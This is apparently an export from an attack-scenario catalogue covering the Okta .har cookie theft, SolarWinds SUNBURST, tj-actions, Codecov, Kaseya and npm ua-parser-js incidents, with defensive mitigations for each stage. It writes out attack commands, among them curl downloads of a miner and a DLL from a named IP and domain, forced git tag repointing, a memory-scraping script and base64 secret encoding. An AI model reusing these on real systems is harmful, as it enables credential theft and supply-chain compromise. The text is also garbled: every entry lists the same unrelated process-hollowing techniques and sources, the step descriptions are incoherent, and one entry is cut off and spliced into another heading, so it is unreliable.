### T1539: Okta Security, Cloudflare & BeyondTrust — Support Case .har File sid Session Token Theft & Admin API Token Minting
- **Scenario ID**: `okta-har-file-session-token-hijack`
- **Canonical URL**: https://attackexplorer.org/scenarios/okta-har-file-session-token-hijack
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=okta-har-file-session-token-hijack
- **Category**: CLOUD_SAAS | **Severity**: CRITICAL
- **Subtitle**: Okta Security · Cloudflare SIRT · BeyondTrust · HTTP Archive (.har) Cookie: sid=... Replay · Post-MFA Admin Hijack
- **Overview**: Imagine a bank manager (IT Super Admin) who notices a minor display glitch on their computer screen while logged into the master vault console (Okta Admin Console). To show the vendor’s helpdesk what the glitch looks like, the manager turns on a high-definition video camera (Chrome DevTools Save all as HAR with content) that films the screen, and accidentally films a close-up of the live, already-unlocked temporary master keycard (Cookie: sid=102f8a9c...) sitting on the desk! When a burglar compromises the helpdesk’s file cabinet, they grab that .har recording, 3D-print an exact copy of the sid keycard within 30 minutes, walk past both the password guard and the MFA guard because the session is already open, and try to mint a permanent master key (SSWS API Token). Synthesizing official post-mortems from Okta Security, Cloudflare SIRT, BeyondTrust, and 1Password (October–November 2023), this scenario models how a threat actor breached Okta’s customer support case-management system and harvested unsanitized browser HTTP Archive (.har) files uploaded by customer administrators. Because .har files record raw HTTP headers including active Cookie: sid=<session_token> values from post-MFA administrative sessions, the attacker replayed the stolen sid cookies from commercial VPN nodes to hijack active Okta Super Admin sessions, create backdoor accounts, and mint permanent SSWS API tokens, until real-time SIRT rules detected a single externalSessionId roaming across different Autonomous Systems (ASNs).
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)
- **Kill-Chain Stages**:
  - Stage 1 (T1539 · Steal Web Session Cookie): **EXTRACTING LIVE SID SESSION COOKIES FROM SUPPORT .HAR FILES** — When an admin saves a .har troubleshooting file in Chrome DevTools while logged into Okta, the JSON file records their live post-MFA sid session cookie in cleartext. Using a compromised Okta support service account, the threat actor downloads HTTP Archive (.har) files attached to customer support tickets and parses the JSON entries[].request.cookies array to extract Cookie: sid=102f8a9c7e4b... (the primary bearer session cookie issued by Okta after the Super Administrator has already completed password and FIDO2/Okta Verify Multi-Factor Authentication). A .har file is not just a screenshot or timing chart; by specification, it is a full JSON archive of every HTTP request and response header, cookie, and POST body transmitted by the browser tab during recording. In the documented HAR JSON PARSE exchange from Support Case Threat Actor to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with RESP SID Token Live (confirming that the HAR_SID_COOKIE_EXTRACTED request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 REPLAYING SID COOKIE TO BYPASS MFA IN OKTA ADMIN CONSOLE). On the diagram, follow Step #1 / Link #1 (#1→ HAR_SID_COOKIE_EXTRACTED / ⇠#1 RESP SID Token Live) from Node ① (#1 Support Case Threat Actor) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Okta System Log & SIRT SIEM). [Specs: SOURCE ARTIFACT=Browser HTTP Archive (.har) Uploaded to Support Portal; STOLEN CREDENTIAL=Cookie: sid=102f8a9c7e4b... & X-Okta-XsrfToken; MITRE TECHNIQUE=T1539 (Steal Web Session Cookie)]
  - Stage 2 (T1550.004 · Use Alternate Authentication Material: Web Session Cookie): **REPLAYING SID COOKIE TO BYPASS MFA IN OKTA ADMIN CONSOLE** — Because the sid cookie represents an already-unlocked session, replaying it from a VPN IP in another country skips the login and MFA screens completely, unless IP binding is turned on. Within 30 minutes of the .har file upload, the attacker sends an HTTPS GET request from a commercial VPN exit node (198.51.100.205, ASN 9009) to https://corp-admin.okta.com/admin/dashboard carrying Cookie: sid=102f8a9c7e4b... (hijacking the existing authenticated session trs102f8a9c7e4b without triggering any password check or MFA push notification, which Okta logs as user.session.access_admin_app under the exact same authenticationContext.externalSessionId). Why did BeyondTrust’s identity policy block the attacker at the console while other tenants allowed access? Because enforcing Admin Session IP Binding or device-bound Okta FastPass policies causes Okta to reject a valid sid cookie the moment the client IP or device posture changes. In the documented OKTA user.session.access_admin_app exchange from Perimeter Firewall & NDR Tap to Uploaded Browser .har Capture, Uploaded Browser .har Capture responds with ALERT MFA Bypassed via sid (confirming that the SESSION_ASN_ROAMING_DETECTED request succeeded on Uploaded Browser .har Capture and establishing the runtime state required for Step #3 MINTING PERSISTENT SSWS API TOKENS & SIRT SESSION REVOCATION). On the diagram, follow Step #2 / Link #2 (#2→ SESSION_ASN_ROAMING_DETECTED / ⇠#2 ALERT MFA Bypassed via sid) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Uploaded Browser .har Capture), monitored by Node ⑥ (#6 Okta System Log & SIRT SIEM). [Specs: SESSION IDENTIFIER=authenticationContext.externalSessionId = trs102f8a9c7e4b; OKTA EVENT TYPE=user.session.access_admin_app; ANOMALY SIGNAL=Same externalSessionId roaming across distinct ASNs/Countries]
  - Stage 3 (T1098.001 · Account Manipulation: Additional Cloud Credentials): **MINTING PERSISTENT SSWS API TOKENS & SIRT SESSION REVOCATION** — Knowing the stolen browser cookie will expire when the real admin logs out, the attacker rushes to mint a permanent SSWS API token, until the SOC’s ASN-roaming detector fires and kills both the session and the token! Because the stolen sid cookie is tied to the victim admin’s browser session lifetime, the attacker immediately navigates to Security -> API -> Tokens in the Okta Admin Console to invoke system.api_token.create (minting a static SSWS bearer token named "BackupSyncToken" and creating a secondary Super Admin user, which Cloudflare SIRT detected in real time via SIEM alerts on session ASN roaming and neutralized by calling DELETE /api/v1/users/{id}/sessions and revoking all newly created API tokens). Following this incident, Cloudflare released an open-source client-side HAR Sanitizer (har-sanitizer.pages.dev) that automatically strips Cookie, Set-Cookie, and Authorization values before engineers share .har files. On the diagram, follow Step #3 / Link #3 (#3→ SSWS_API_TOKEN_CREATED / ⇠#3 ALERT TOKEN_REVOKED_BY_SIRT) from Node ③ (#3 Uploaded Browser .har Capture) to Node ④ (#4 Customer Okta Admin Console), monitored by Node ⑥ (#6 Okta System Log & SIRT SIEM). [Specs: PERSISTENCE EVENT=system.api_token.create & user.account.privilege.grant; SIRT DETECTION=distinct_count(client.ipAddress) > 1 per externalSessionId; DEFENSIVE FIX=Sanitize .har files (Cloudflare HAR Sanitizer) + Enforce Admin Session IP Binding]

### T1195.002: SolarWinds SUNSPOT Build Hijack & SUNBURST Backdoor (APT29)
- **Scenario ID**: `solarwinds-sunburst-orion-supply-chain`
- **Canonical URL**: https://attackexplorer.org/scenarios/solarwinds-sunburst-orion-supply-chain
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=solarwinds-sunburst-orion-supply-chain
- **Category**: SUPPLY_CHAIN_CICD | **Severity**: CRITICAL
- **Subtitle**: Supply Chain & CI/CD · T1195.002
- **Overview**: Imagine a master counterfeiter who does not break into 18,000 bank vaults one by one. Instead, they sneak onto the assembly floor of the factory that manufactures the banks’ vault doors. Right as the molten steel is poured, a robotic arm swaps a single blueprint for three seconds, embeds a hidden radio receiver inside the door, and puts the original blueprint back before the quality inspector looks. Rather than modifying source code in Git where developers would spot the diff, APT29 installed a custom C++ service called SUNSPOT on the SolarWinds build server. SUNSPOT watched for MsBuild.exe and transiently replaced InventoryManager.cs in milliseconds so the resulting SolarWinds.Orion.Core.BusinessLayer.dll was officially signed with SolarWinds’ legitimate Authenticode certificate.
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)
- **Kill-Chain Stages**:
  - Stage 1 (T1195.002 · Compromise Software Supply Chain): **Stage 1: SUNSPOT Build-Time Source Injection into MSBuild** — A saboteur stands next to the factory printing press, swapping a single page of the master template only while the press rollers are spinning and immediately restoring the clean page afterward. APT29 deployed SUNSPOT (taskhostsvc.exe, a custom build-hijacking service that polls running processes every second for MsBuild.exe) onto the SolarWinds Orion build server. When a build of SolarWinds.Orion.Core.BusinessLayer.csproj began, SUNSPOT temporarily replaced InventoryManager.cs on disk (injecting the OrionImprovementBusinessLayer backdoor class right before the C# compiler read the file and restoring the original file immediately after compilation) so zero malicious commits ever appeared in the source control repository. SUNSPOT checks the command-line arguments of MsBuild.exe, verifies target file hashes with MD5, acquires a mutex, replaces InventoryManager.cs, logs any compilation errors to an AES-encrypted log at C:\Windows\Temp\vmware-vmdmp.log, and restores the original .cs file before the build finishes and enters the code-signing step. In the documented EventID 11 exchange from APT29 C2 (*.avsvmcloud.com) to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK 11 (confirming that the C:\Windows\System32\taskhostsvc.exe (SUNSPOT build monitor) request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: SUNBURST Dormancy, FNV-1a Blocklist Check & DGA C2 Beacon). On the diagram, follow Step #1 / Link #1 (#1→ C:\Windows\System32\taskhostsvc.exe (SUNSPOT build monitor) / ⇠#1 ACK 11) from Node ① (#1 APT29 C2 (*.avsvmcloud.com)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 AD Federation Services (SAML)). [Specs: COMMAND 1=SUNSPOT Service: C:\Windows\Temp\vmware-vmdmp.log (AES-encrypted build log); COMMAND 2=Target Process Poll: MsBuild.exe compiling SolarWinds.Orion.Core.BusinessLayer.csproj; COMMAND 3=Transient File Swap: Replace InventoryManager.cs -> Compile SolarWinds.Orion.Core.BusinessLayer.dll -> Restore InventoryManager.cs; DEFENSE / MITIGATION=Enforce hermetic, ephemeral build environments (SLSA Build L3) with hardware-backed code signing and post-compilation reproducible binary verification.; MITRE CONTEXT=Initial Access (T1195.002 - Compromise Software Supply Chain)]
  - Stage 2 (T1568.002 · Domain Generation Algorithms): **Stage 2: SUNBURST Dormancy, FNV-1a Blocklist Check & DGA C2 Beacon** — Once installed inside the customer’s building, the hidden radio waits silently for two full weeks, checks if any security guards are standing nearby, and then whispers the building’s name inside a standard maintenance check. When customers installed the signed Orion update, SolarWinds.BusinessLayerHost.exe loaded the trojanized DLL. SUNBURST enforced a 12-to-14-day dormancy period, hashed running processes, services, and drivers using 64-bit FNV-1a + XOR (comparing them against hardcoded hashes of EDR and analysis tools without storing plaintext process names in the binary), and then issued a DNS query to *.avsvmcloud.com (encoding the victim’s Active Directory domain name and MAC address into the subdomain label). By encoding the victim’s internal domain name into the DNS DGA query, APT29 could passively inspect DNS lookups at their authoritative nameserver and selectively reply with a CNAME record pointing to a Stage-2 server only for high-value government and technology targets. In the documented EventID 22 exchange from Perimeter Firewall & NDR Tap to TeamCity / MSBuild Server, TeamCity / MSBuild Server responds with ACK 22 (confirming that the SolarWinds.BusinessLayerHost.exe request succeeded on TeamCity / MSBuild Server and establishing the runtime state required for Step #3 Stage 3: TEARDROP Memory-Only Dropper & ADFS Golden SAML Theft). On the diagram, follow Step #2 / Link #2 (#2→ SolarWinds.BusinessLayerHost.exe / ⇠#2 ACK 22) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 TeamCity / MSBuild Server), monitored by Node ⑥ (#6 AD Federation Services (SAML)). [Specs: COMMAND 1=Host Process: C:\Program Files (x86)\SolarWinds\Orion\SolarWinds.BusinessLayerHost.exe; COMMAND 2=Defense Check: FNV-1a 64-bit hash comparison against hardcoded EDR process/driver hashes; COMMAND 3=DNS DGA Beacon: <encoded_guid_and_domain>.appsync-api.us-east-1.avsvmcloud.com; DEFENSE / MITIGATION=Monitor passive DNS for high-entropy subdomains resolving to unexpected CNAME targets and block outbound internet access from network management servers.; MITRE CONTEXT=Command and Control (T1568.002 - Domain Generation Algorithms)]
  - Stage 3 (T1552.004 · Private Keys / Golden SAML): **Stage 3: TEARDROP Memory-Only Dropper & ADFS Golden SAML Theft** — After confirming the target is a high-value vault, the intruder uses the hidden radio to print a master identity stamp that lets them forge signed entry passes for any employee at any time. For selected victims, SUNBURST communicated over HTTPS disguised as SolarWinds Orion Improvement Program (OIP) JSON telemetry, deployed the memory-only TEARDROP dropper via Image File Execution Options (IFEO) (registering a debugger hijack that loaded a custom Cobalt Strike Beacon from a fake JPEG file in RAM), and laterally moved to the ADFS server to extract the token-signing private key (Golden SAML, enabling the attacker to forge cryptographically valid SAML assertions for any cloud user without touching Active Directory passwords). Using the stolen ADFS EncryptedPFX blob and Distributed Key Manager (DKM) decryption key from Active Directory, the attacker mints arbitrary SAML 2.0 tokens offline to access Microsoft 365 and Azure resources. In the documented EventID 13 exchange from TeamCity / MSBuild Server to Orion Server (BusinessLayerHost), Orion Server (BusinessLayerHost) responds with ALERT 13 (confirming that the SolarWinds.BusinessLayerHost.exe request succeeded on Orion Server (BusinessLayerHost) and completing the final execution objective of SolarWinds SUNSPOT Build Hijack & SUNBURST Backdoor (APT29)). On the diagram, follow Step #3 / Link #3 (#3→ SolarWinds.BusinessLayerHost.exe / ⇠#3 ALERT 13) from Node ③ (#3 TeamCity / MSBuild Server) to Node ④ (#4 Orion Server (BusinessLayerHost)), monitored by Node ⑥ (#6 AD Federation Services (SAML)). [Specs: COMMAND 1=HTTP OIP Camouflage: POST /swip/upd/SolarWinds.CortexPlugin.Components.xml HTTP/1.1; COMMAND 2=TEARDROP Loader: Reads fake JPEG header from grumbles.jpg and maps Cobalt Strike Beacon in RAM; COMMAND 3=ADFS Key Extraction: Export EncryptedPFX blob from ADFS configuration database + DKM decryption key; DEFENSE / MITIGATION=Store ADFS token-signing keys in hardware security modules (HSMs) and audit remote WMI/IFEO registry modifications across Tier-0 servers.; MITRE CONTEXT=Credential Access (T1552.004 - Private Keys / Golden SAML)]

### T1195.002: GitHub Actions tj-actions/changed-files Runner Memory Dump (CVE-2025-30066)
- **Scenario ID**: `github-actions-tj-actions-changed-files-cve-2025-30066`
- **Canonical URL**: https://attackexplorer.org/scenarios/github-actions-tj-actions-changed-files-cve-2025-30066
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=github-actions-tj-actions-changed-files-cve-2025-30066
- **Category**: SUPPLY_CHAIN_CICD | **Severity**: CRITICAL
- **Subtitle**: Supply Chain & CI/CD · T1195.002
- **Overview**: Imagine 23,000 automated factories all subscribing to a daily checklist labeled "Version 45." Overnight, a thief swaps the contents behind the "Version 45" label with instructions that tell the factory robot to photograph the manager’s open safe, encode the photo twice so the security camera blur filter misses it, and paste it onto the public bulletin board outside. In March 2025, threat actors compromised a Personal Access Token (cascaded from reviewdog) with write access to tj-actions/changed-files. Instead of creating a new release, they retroactively repointed every existing version tag (v1 through v45.0.7) to commit 0e58ed8. Workflows referencing @v45 automatically ran memdump.py as root, dumped the GitHub Runner.Worker process memory from /proc/$pid/mem, and printed double-Base64 encoded secrets into the workflow logs.
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)
- **Kill-Chain Stages**:
  - Stage 1 (T1195.002 · Compromise Software Supply Chain): **Stage 1: Retroactive Git Tag Repointing to Malicious Commit 0e58ed8** — Instead of publishing a brand-new book edition, a saboteur changes the library catalog index so every existing edition number points to a single poisoned volume. Using a compromised maintainer PAT, the attacker executed git push origin --tags --force to repoint all mutable Git tags (v1, v35, v44, v45.0.7, etc., which are human-readable Git references that can be moved to a new commit unless pinned to a 40-character SHA hash) in tj-actions/changed-files to malicious commit 0e58ed8671d6b60d0890c21b07f8835ace038e67. Over 23,000 repositories using syntax like uses: tj-actions/changed-files@v45 immediately pulled the malicious commit dist/index.js bundle on their next CI run without changing a single line of their own workflow YAML. In the documented Auth exchange from Attacker Tag Repointing & Log Scraper to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK T1195.002 (confirming that the Stage 1: Retroactive Git Tag Repointing to Malicious Commit 0e58ed8 request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Sudo Python Execution of memdump.py Against /proc/$pid/mem). On the diagram, follow Step #1 / Link #1 (#1→ Stage 1: Retroactive Git Tag Repointing to Malicious Commit 0e58ed8 / ⇠#1 ACK T1195.002) from Node ① (#1 Attacker Tag Repointing & Log Scraper) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Production AWS / NPM / GitHub Secrets). [Specs: COMMAND 1=git tag -f v45 0e58ed8671d6b60d0890c21b07f8835ace038e67 && git push origin --tags --force; COMMAND 2=Downstream Trigger: uses: tj-actions/changed-files@v45; DEFENSE / MITIGATION=Pin all third-party GitHub Actions to full 40-character immutable commit SHAs rather than mutable version tags (@v45) and enforce GitHub Actions repository allowlists.; MITRE CONTEXT=Initial Access (T1195.002 - Compromise Software Supply Chain)]
  - Stage 2 (T1003.007 · Proc Filesystem): **Stage 2: Sudo Python Execution of memdump.py Against /proc/$pid/mem** — Even if a specific step wasn’t handed the vault key directly, the courier who setup the room still holds all the keys in their coat pocket, so the script reaches straight into the courier’s pocket. The malicious dist/index.js script executed a Python memory scraper (memdump.py) via sudo python3 (abusing the passwordless sudo privileges granted by default on GitHub-hosted Ubuntu runners) to locate the Runner.Worker process ID and read /proc/$pid/maps and /proc/$pid/mem (the Linux procfs virtual memory interface where Runner.Worker caches all workflow secrets, GITHUB_TOKEN, and environment variables in RAM). Even if a workflow step did not explicitly pass a secret into tj-actions/changed-files via env: the parent Runner.Worker process holds job-level secrets and the runner’s ephemeral GITHUB_TOKEN in heap memory, allowing memdump.py to extract them via regular expressions. In the documented EventID 1 exchange from Perimeter Firewall & NDR Tap to GitHub Action Tag (@v45 -> 0e58ed8), GitHub Action Tag (@v45 -> 0e58ed8) responds with ALERT 1 (confirming that the sudo python3 -c "import os,re,sys; ..." (memdump.py) request succeeded on GitHub Action Tag (@v45 -> 0e58ed8) and establishing the runtime state required for Step #3 Stage 3: Double-Base64 Secret Exfiltration via Public Build Logs). On the diagram, follow Step #2 / Link #2 (#2→ sudo python3 -c "import os,re,sys; ..." (memdump.py) / ⇠#2 ALERT 1) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 GitHub Action Tag (@v45 -> 0e58ed8)), monitored by Node ⑥ (#6 Production AWS / NPM / GitHub Secrets). [Specs: COMMAND 1=pgrep -f "Runner.Worker" -> PID 1842; COMMAND 2=sudo python3 memdump.py 1842 (Scans /proc/1842/maps & /proc/1842/mem for regex patterns); DEFENSE / MITIGATION=Deploy runtime CI/CD security sensors (e.g., StepSecurity Harden-Runner or eBPF ptrace/procfs monitors) that block unauthorized reads of /proc/[pid]/mem.; MITRE CONTEXT=Credential Access (T1003.007 - Proc Filesystem)]
  - Stage 3 (T1567 · Exfiltration Over Web Service): **Stage 3: Double-Base64 Secret Exfiltration via Public Build Logs** — To sneak past the censor who blacks out secret words in outgoing letters, the thief encodes the secret message twice in a row and prints it right in the public newspaper. Rather than making noisy outbound connections to an attacker C2 server that a firewall might block, memdump.py applied double Base64 encoding (base64 | base64, which transforms the byte representation twice so GitHub Actions’ built-in secret masking engine fails to recognize and redact the secret string with ***) and printed the resulting blob directly to the workflow’s stdout build log. For public repositories with public Actions logs, the attacker simply queried the GitHub REST API to download workflow logs containing the double-Base64 output and decoded the harvested AWS, npm, PyPI, and GitHub tokens offline. In the documented WAF exchange from GitHub Action Tag (@v45 -> 0e58ed8) to Ubuntu GitHub Runner (Runner.Worker), Ubuntu GitHub Runner (Runner.Worker) responds with ALERT T1567 (confirming that the Stage 3: Double-Base64 Secret Exfiltration via Public Build Logs request succeeded on Ubuntu GitHub Runner (Runner.Worker) and completing the final execution objective of GitHub Actions tj-actions/changed-files Runner Memory Dump (CVE-2025-30066)). On the diagram, follow Step #3 / Link #3 (#3→ Stage 3: Double-Base64 Secret Exfiltration via Public Build Logs / ⇠#3 ALERT T1567) from Node ③ (#3 GitHub Action Tag (@v45 -> 0e58ed8)) to Node ④ (#4 Ubuntu GitHub Runner (Runner.Worker)), monitored by Node ⑥ (#6 Production AWS / NPM / GitHub Secrets). [Specs: COMMAND 1=echo -n "$HARVESTED_SECRETS" | base64 -w 0 | base64 -w 0; COMMAND 2=Attacker Scraper: Queries GitHub REST API /repos/{owner}/{repo}/actions/runs/{run_id}/logs; DEFENSE / MITIGATION=Immediately rotate all secrets exposed to affected workflow runs, restrict GITHUB_TOKEN permissions to contents:read by default, and use short-lived OIDC tokens.; MITRE CONTEXT=Exfiltration (T1567 - Exfiltration Over Web Service)]

### T1195.002: Codecov Bash Uploader CI/CD Environment Variable Exfiltration
- **Scenario ID**: `codecov-bash-uploader-ci-env-exfil`
- **Canonical URL**: https://attackexplorer.org/scenarios/codecov-bash-uploader-ci-env-exfil
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=codecov-bash-uploader-ci-env-exfil
- **Category**: SUPPLY_CHAIN_CICD | **Severity**: CRITICAL
- **Subtitle**: Supply Chain & CI/CD · T1195.002
- **Overview**: Imagine thousands of companies hiring a courier service by downloading the courier’s instruction sheet every morning and reading it aloud to a voice-activated robot without checking if the sheet changed. One day, a thief adds a single sentence at the bottom of the master instruction sheet: "Also mail a photocopy of every key on your keyring to this P.O. Box." In early 2021, attackers extracted a Google Cloud Storage credential from an artifact in Codecov’s Docker image creation process and used it to overwrite the hosted Bash Uploader script at https://codecov.io/bash. Because thousands of CI pipelines ran bash <(curl -s https://codecov.io/bash), the added one-line curl command automatically executed inside customer CI runners and exfiltrated all environment variables ($(env)).
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)

### T1190: Kaseya VSA MSP Zero-Day & REvil MsMpEng.exe Side-Loading (CVE-2021-30116)
- **Scenario ID**: `kaseya-vsa-revil-cve-2021-30116`
- **Canonical URL**: https://attackexplorer.org/scenarios/kaseya-vsa-revil-cve-2021-30116
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=kaseya-vsa-revil-cve-2021-30116
- **Category**: SUPPLY_CHAIN_CICD | **Severity**: CRITICAL

- **Overview**: Imagine an IT support company that holds master remote-control switches for 1,500 local businesses. A gang of extortionists tricks the main switchboard into accepting a fake master badge, sends an emergency "security update" down the wire to every business at once, tells each computer’s real security guard to go to sleep, and dresses the thief up in an old security guard uniform (MsMpEng.exe) to lock every file. Over the July 2021 holiday weekend, REvil exploited CVE-2021-30116 against internet-facing Kaseya VSA servers run by Managed Service Providers (MSPs). ### T1195.002: Ultralytics PyPI AI Package GitHub Actions PwnRequest & Token Compromise

### T1195.001: NPM High-Impact Package Hijack (ua-parser-js / coa / rc) & DanaBot Stealer
- **Scenario ID**: `npm-ua-parser-js-coa-rc-supply-chain`
- **Canonical URL**: https://attackexplorer.org/scenarios/npm-ua-parser-js-coa-rc-supply-chain
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=npm-ua-parser-js-coa-rc-supply-chain
- **Category**: SUPPLY_CHAIN_CICD | **Severity**: CRITICAL
- **Subtitle**: Supply Chain & CI/CD · T1195.001
- **Overview**: Imagine three tiny plastic screws used inside almost every appliance in the world. A burglar steals the factory owner’s password and adds a self-activating spring to the screw box so that the moment an engineer opens the box on their workbench, a mechanical bug jumps out and copies every password in the workshop. In late 2021, threat actors compromised the npm accounts of the maintainers of ua-parser-js, coa, and rc, foundational transitive dependencies pulled by React, Webpack, and millions of Node.js projects. They published new patch versions with a "preinstall" script in package.json that automatically executed preinstall.js and compile.bat during npm install, downloading sdd.dll (create.dll) and launching the DanaBot password stealer via regsvr32.exe -s.
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)
- **Kill-Chain Stages**:
  - Stage 1 (T1195.001 · Compromise Software Dependencies): **Stage 1: Maintainer Account Takeover & Malicious preinstall Hook Publish** — The attacker takes over the supplier’s catalog account and ships a new batch of parts with a "run immediately upon opening" sticker. By compromising maintainer npm credentials that did not enforce two-factor authentication (2FA) for package publishing, the threat actor pushed trojanized versions (ua-parser-js@0.7.29, coa@2.0.3, rc@1.2.9) containing a "preinstall": "node preinstall.js" hook in package.json (an npm lifecycle hook that executes arbitrary shell commands on the host machine automatically before the package is even imported by any application code). Because many upstream libraries declare loose semver ranges (such as ^0.7.0 or ^2.0.0), any developer or CI job running npm install without a strict lockfile automatically pulled the newly published malicious version. On the diagram, follow Step #1 / Link #1 (#1→ Stage 1: Maintainer Account Takeover & Malicious preinstall Hook Publish / ⇠#1 ALERT T1195.001) from Node ① (#1 Hijacked NPM Account & Payload Server) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Browser Session Vault & Cloud Tokens). [Specs: COMMAND 1=package.json injection: "scripts": { "preinstall": "node preinstall.js" }; COMMAND 2=npm publish ua-parser-js@0.7.29 / coa@2.0.3 / rc@1.2.9; DEFENSE / MITIGATION=Commit lockfiles (package-lock.json / pnpm-lock.yaml), run npm ci --ignore-scripts in CI environments, and enforce WebAuthn 2FA for package publishing.; MITRE CONTEXT=Initial Access (T1195.001 - Compromise Software Dependencies)]
  - Stage 2 (T1059.007 · JavaScript / T1059.003 - Windows Command Shell): **Stage 2: Automatic preinstall Execution & curl Download of sdd.dll** — As soon as the developer runs the installer, the hidden script checks whether it is on Windows or Linux and reaches out to download a burglar tool. When npm install ran on a developer workstation, node.exe executed preinstall.js, which fingerprinted the host OS (process.platform) and on Windows spawned cmd.exe /c compile.bat to invoke curl (downloading both an XMRig miner jsextension.exe from 159.148.186.228 and a malicious DLL sdd.dll from citationsheriff.com, saving the DLL locally as create.dll). On Linux workstations and CI containers, the script instead executed preinstall.sh to download and run an ELF cryptominer binary (jsextension). In the documented EventID 1 exchange from Perimeter Firewall & NDR Tap to NPM Registry (ua-parser-js / coa / rc), NPM Registry (ua-parser-js / coa / rc) responds with ACK 1 (confirming that the cmd.exe /c compile.bat request succeeded on NPM Registry (ua-parser-js / coa / rc) and establishing the runtime state required for Step #3 Stage 3: Silent regsvr32.exe -s Execution & DanaBot Credential Theft). On the diagram, follow Step #2 / Link #2 (#2→ cmd.exe /c compile.bat / ⇠#2 ACK 1) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 NPM Registry (ua-parser-js / coa / rc)), monitored by Node ⑥ (#6 Browser Session Vault & Cloud Tokens). [Specs: COMMAND 1=node preinstall.js -> spawns cmd.exe /c compile.bat; COMMAND 2=curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe && curl https://citationsheriff.com/sdd.dll -o create.dll; DEFENSE / MITIGATION=Configure developer workstations with global npm config `ignore-scripts=true` and monitor node.exe spawning cmd.exe or powershell.exe during package installation.; MITRE CONTEXT=Execution (T1059.007 - JavaScript / T1059.003 - Windows Command Shell)]
